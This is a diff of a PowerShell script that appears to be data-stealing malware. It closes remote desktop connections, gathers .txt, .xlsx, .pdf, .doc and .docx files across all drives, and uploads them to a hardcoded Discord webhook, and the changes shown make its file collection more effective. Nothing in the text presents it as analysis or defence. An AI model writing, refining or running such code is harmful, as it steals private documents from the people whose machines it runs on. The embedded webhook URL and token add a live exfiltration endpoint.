@@ -62,7 +62,7 @@ function Get-FilesInRotation {
 
     $files = @()
     foreach ($extension in $extensions) {
-        $files += Get-ChildItem -Path $rootPath -Filter "*.$extension" -Recurse -ErrorAction SilentlyContinue
+        $files += Get-ChildItem -Path $rootPath -Filter "*.$extension" -Recurse -File -ErrorAction SilentlyContinue
     }
     return $files
 }
@@ -81,17 +81,19 @@ Close-RemoteDesktopConnections
 # Recursively get all .txt, .xlsx, .pdf, .doc, .docx files from all drives in rotation
 $webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
 $extensions = @("txt", "xlsx", "pdf", "doc", "docx")
-$drives = Get-PSDrive -PSProvider FileSystem
+$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -gt 0 }
 
 $startTime = Get-Date
 foreach ($drive in $drives) {
-    $files = Get-FilesInRotation -rootPath $drive.Root -extensions $extensions
-    foreach ($file in $files) {
-        $currentTime = Get-Date
-        if (($currentTime - $startTime).TotalSeconds -gt 30) {
-            break
+    foreach ($extension in $extensions) {
+        $files = Get-FilesInRotation -rootPath $drive.Root -extensions @($extension)
+        foreach ($file in $files) {
+            $currentTime = Get-Date
+            if (($currentTime - $startTime).TotalSeconds -gt 30) {
+                break
+            }
+            Upload-FileToDiscord -filePath $file.FullName -webhookUrl $webhookUrl
         }
-        Upload-FileToDiscord -filePath $file.FullName -webhookUrl $webhookUrl
     }
 }
 
